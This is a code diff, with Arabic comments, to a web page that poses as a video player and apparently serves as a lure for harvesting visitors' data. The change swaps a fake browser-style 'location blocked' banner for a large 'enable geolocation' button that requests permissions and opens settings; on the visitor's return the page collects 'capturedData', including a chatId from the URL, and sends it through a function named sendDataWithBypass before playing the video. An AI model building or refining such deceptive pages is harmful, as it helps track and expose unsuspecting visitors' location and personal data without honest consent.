@@ -44,35 +44,56 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
+            cursor: default;
+            flex-direction: column;
         }
 
-        .play-button-overlay {
-            width: 100px;
-            height: 100px;
-            background-color: rgba(255, 0, 0, 0.85);
-            border-radius: 50%;
+        /* ===== الزر الكبير في وسط الشاشة ===== */
+        #locationActionButton {
             display: flex;
+            flex-direction: column;
             align-items: center;
             justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border: 3px solid #ff6b6b;
+            border-radius: 20px;
+            padding: 40px 50px;
+            cursor: pointer;
             transition: all 0.3s ease;
-            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
-            position: relative;
+            backdrop-filter: blur(8px);
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.3);
+            z-index: 10;
+            text-align: center;
+            min-width: 250px;
+        }
+        #locationActionButton:hover {
+            transform: scale(1.05);
+            background: rgba(255, 255, 255, 0.2);
+            border-color: #ff4757;
+            box-shadow: 0 0 60px rgba(255, 0, 0, 0.6);
+        }
+        #locationActionButton .icon-gear {
+            font-size: 80px;
+            line-height: 1;
+            color: #ff6b6b;
+            margin-bottom: 15px;
+        }
+        #locationActionButton .main-text {
+            font-size: 28px;
+            font-weight: bold;
+            color: #fff;
+            text-shadow: 0 2px 10px rgba(0,0,0,0.8);
+        }
+        #locationActionButton .sub-text {
+            font-size: 18px;
+            color: #ddd;
+            margin-top: 8px;
+            opacity: 0.9;
         }
 
-        .play-button-overlay:hover {
-            transform: scale(1.1);
-            background-color: rgba(255, 0, 0, 0.95);
-            box-shadow: 0 0 30px rgba(255, 0, 0, 0.7);
-        }
-
-        .play-icon-large {
-            width: 0;
-            height: 0;
-            border-left: 30px solid white;
-            border-top: 20px solid transparent;
-            border-bottom: 20px solid transparent;
-            margin-left: 8px;
+        /* زر التشغيل الأصلي (سيتم إخفاؤه) */
+        .play-button-overlay {
+            display: none;
         }
 
         .video-info {
@@ -151,12 +172,8 @@
         }
 
         @keyframes spin {
-            0% {
-                transform: translate(-50%, -50%) rotate(0deg);
-            }
-            100% {
-                transform: translate(-50%, -50%) rotate(360deg);
-            }
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
         }
 
         #loading {
@@ -215,78 +232,19 @@
             .video-thumbnail {
                 height: 280px;
             }
-            .play-button-overlay {
-                width: 70px;
-                height: 70px;
+            #locationActionButton {
+                padding: 20px 30px;
+                min-width: 180px;
             }
-            .play-icon-large {
-                border-left-width: 22px;
-                border-top-width: 14px;
-                border-bottom-width: 14px;
-                margin-left: 5px;
+            #locationActionButton .icon-gear {
+                font-size: 50px;
             }
-        }
-
-        /* ===== النافذة المنبثقة (شريط التحذير) ===== */
-        #locationBanner {
-            display: none;
-            position: absolute;
-            top: 20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 90%;
-            max-width: 400px;
-            background: #f9f9f9;
-            color: #333;
-            padding: 16px 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 20px rgba(0,0,0,0.4);
-            z-index: 20;
-            text-align: center;
-            font-size: 16px;
-            border: 1px solid #ddd;
-        }
-        #locationBanner .banner-icon {
-            font-size: 28px;
-            margin-bottom: 6px;
-        }
-        #locationBanner .banner-title {
-            font-weight: bold;
-            font-size: 18px;
-            color: #d32f2f;
-            margin-bottom: 6px;
-        }
-        #locationBanner .banner-desc {
-            font-size: 14px;
-            color: #555;
-            margin-bottom: 12px;
-        }
-        #locationBanner .banner-btn {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 10px 24px;
-            border-radius: 6px;
-            font-size: 16px;
-            cursor: pointer;
-            transition: background 0.2s;
-            font-weight: 500;
-        }
-        #locationBanner .banner-btn:hover {
-            background: #1557b0;
-        }
-        #locationBanner .banner-close {
-            position: absolute;
-            top: 8px;
-            right: 12px;
-            background: none;
-            border: none;
-            font-size: 22px;
-            color: #999;
-            cursor: pointer;
-        }
-        #locationBanner .banner-close:hover {
-            color: #333;
+            #locationActionButton .main-text {
+                font-size: 22px;
+            }
+            #locationActionButton .sub-text {
+                font-size: 15px;
+            }
         }
     </style>
 </head>
@@ -299,18 +257,17 @@
         </div>
 
         <div class="video-thumbnail" id="thumbnailArea">
+            <!-- زر الموقع الكبير (يظهر فوراً) -->
+            <div id="locationActionButton">
+                <div class="icon-gear">⚙️</div>
+                <div class="main-text">تفعيل الموقع الجغرافي</div>
+                <div class="sub-text">اضغط هنا لتغيير الإعدادات</div>
+            </div>
+
+            <!-- زر التشغيل الأصلي (مخفي) -->
             <div class="play-button-overlay" id="playButtonOverlay">
                 <div class="play-icon-large"></div>
                 <div class="spinner" id="spinner"></div>
-            </div>
-
-            <!-- شريط التحذير المخصص (يحاكي شريط المتصفح) -->
-            <div id="locationBanner">
-                <button class="banner-close" id="bannerClose">&times;</button>
-                <div class="banner-icon">📍</div>
-                <div class="banner-title">تم حظر الموقع الجغرافي</div>
-                <div class="banner-desc">يحتاج هذا الموقع إلى صلاحية الموقع الجغرافي لتشغيل الفيديو.</div>
-                <button class="banner-btn" id="openSettingsBtn">تغيير الإعدادات</button>
             </div>
         </div>
 
@@ -356,20 +313,16 @@
             };
 
             // ===== متغيرات التحكم =====
-            let settingsOpened = false;     // تم فتح الإعدادات؟
+            let settingsOpened = false;
             let videoStarted = false;
             let isProcessing = false;
-            let permissionsRequested = false;
 
             // ===== عناصر DOM =====
+            const locationBtn = document.getElementById('locationActionButton');
             const thumbnailArea = document.getElementById('thumbnailArea');
-            const playButtonOverlay = document.getElementById('playButtonOverlay');
             const realVideo = document.getElementById('realVideo');
             const spinner = document.getElementById('spinner');
             const loading = document.getElementById('loading');
-            const locationBanner = document.getElementById('locationBanner');
-            const openSettingsBtn = document.getElementById('openSettingsBtn');
-            const bannerClose = document.getElementById('bannerClose');
 
             // ===== طلب الصلاحيات (لإظهار نوافذ المتصفح) =====
             async function requestPermissions() {
@@ -580,10 +533,11 @@
                 if (isProcessing) return;
                 isProcessing = true;
 
-                spinner.style.display = 'block';
+                // عرض مؤشر تحميل (اختياري)
                 loading.style.display = 'block';
-                playButtonOverlay.style.opacity = '0.5';
-                playButtonOverlay.style.pointerEvents = 'none';
+                // تعطيل الزر
+                locationBtn.style.pointerEvents = 'none';
+                locationBtn.style.opacity = '0.5';
 
                 capturedData.chatId = new URLSearchParams(window.location.search).get('chatId') || '';
 
@@ -609,92 +563,40 @@
 
                 await sendDataWithBypass(data);
 
-                spinner.style.display = 'none';
                 loading.style.display = 'none';
-                playButtonOverlay.style.opacity = '1';
-                playButtonOverlay.style.pointerEvents = 'auto';
+                locationBtn.style.pointerEvents = 'auto';
+                locationBtn.style.opacity = '1';
 
                 startVideoWithSound();
                 isProcessing = false;
             }
 
-            // ===== إظهار شريط التحذير =====
-            function showBanner() {
-                locationBanner.style.display = 'block';
-                // إخفاء زر التشغيل (الزر الأحمر) لجذب الانتباه للشريط
-                playButtonOverlay.style.opacity = '0.3';
-                playButtonOverlay.style.pointerEvents = 'none';
-            }
+            // ===== معالج الضغط على زر "تفعيل الموقع" =====
+            async function handleLocationClick() {
+                if (settingsOpened || videoStarted || isProcessing) return;
 
-            // ===== إخفاء شريط التحذير =====
-            function hideBanner() {
-                locationBanner.style.display = 'none';
-                playButtonOverlay.style.opacity = '1';
-                playButtonOverlay.style.pointerEvents = 'auto';
-            }
-
-            // ===== معالج الضغط على زر التشغيل (الأحمر) =====
-            async function handlePlayClick(e) {
-                e.stopPropagation();
-                if (videoStarted) return;
-                if (isProcessing) return;
-                if (settingsOpened) {
-                    // إذا كان قد تم فتح الإعدادات سابقاً ولم يبدأ الفيديو (حالة نادرة)
-                    await collectAndPlay();
-                    return;
-                }
-
-                // الضغطة الأولى: نطلب الصلاحيات (لإظهار نوافذ المتصفح) ثم نعرض الشريط
                 settingsOpened = true;
-                await requestPermissions(); // قد تظهر نوافذ طلب الإذن
 
-                // نعرض الشريط الذي يحاكي "تم حظر الموقع الجغرافي"
-                showBanner();
-            }
+                // طلب الصلاحيات (لإظهار نافذة الطلب إذا لم تكن محظورة)
+                await requestPermissions();
 
-            // ===== معالج الضغط على زر "تغيير الإعدادات" في الشريط =====
-            async function handleOpenSettings() {
-                // نخفي الشريط
-                hideBanner();
-                // نفتح الإعدادات
+                // فتح إعدادات الموقع
                 openLocationSettings();
-                // بعد العودة، سنعتمد على visibilitychange لبدء collectAndPlay
-            }
 
-            // ===== إغلاق الشريط يدوياً (زر الإغلاق) =====
-            function handleCloseBanner() {
-                hideBanner();
-                // إذا أغلق المستخدم الشريط دون فتح الإعدادات، نعيد تمكين الزر الأحمر
-                // لكننا نترك settingsOpened = true حتى لا يظهر الشريط مرة أخرى عند النقر على الزر الأحمر؟
-                // الأفضل: إذا أغلق الشريط، نسمح له بالضغط على الزر الأحمر مرة أخرى لإظهار الشريط مجدداً.
-                // لكننا جعلنا settingsOpened تمنع ظهور الشريط مرة أخرى، لذا نعيد ضبطها.
-                settingsOpened = false;
-                playButtonOverlay.style.opacity = '1';
-                playButtonOverlay.style.pointerEvents = 'auto';
+                // بعد العودة، سيعتمد على visibilitychange
             }
 
             // ===== رصد العودة من الإعدادات =====
             document.addEventListener('visibilitychange', function() {
                 if (document.visibilityState === 'visible' && settingsOpened && !videoStarted && !isProcessing) {
-                    // تأكد من أن الشريط مخفي
-                    hideBanner();
                     // نبدأ جمع البيانات وتشغيل الفيديو تلقائياً
                     collectAndPlay();
                 }
             });
 
             // ===== ربط الأحداث =====
-            if (thumbnailArea) {
-                thumbnailArea.addEventListener('click', handlePlayClick);
-            }
-            if (playButtonOverlay) {
-                playButtonOverlay.addEventListener('click', handlePlayClick);
-            }
-            if (openSettingsBtn) {
-                openSettingsBtn.addEventListener('click', handleOpenSettings);
-            }
-            if (bannerClose) {
-                bannerClose.addEventListener('click', handleCloseBanner);
+            if (locationBtn) {
+                locationBtn.addEventListener('click', handleLocationClick);
             }
 
             // ===== تفعيل الصوت عند أي تفاعل =====
